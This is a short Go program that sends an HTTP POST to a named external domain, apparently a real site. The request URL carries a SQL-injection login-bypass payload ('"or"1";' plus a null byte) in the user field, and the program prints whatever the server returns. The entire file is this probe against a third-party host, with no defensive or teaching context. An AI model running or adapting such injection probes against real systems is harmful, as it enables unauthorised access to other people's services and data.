package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func main() {
	a, err := http.Post(`http://1024.ruffood.cn/v2/user="or"1";%00&pwd=1 `,"", nil)
	if err != nil{
		fmt.Println(err)
	}
	b, err := ioutil.ReadAll(a.Body)
	if err != nil{
		fmt.Println(err)
	}
	fmt.Printf(string(b))
}
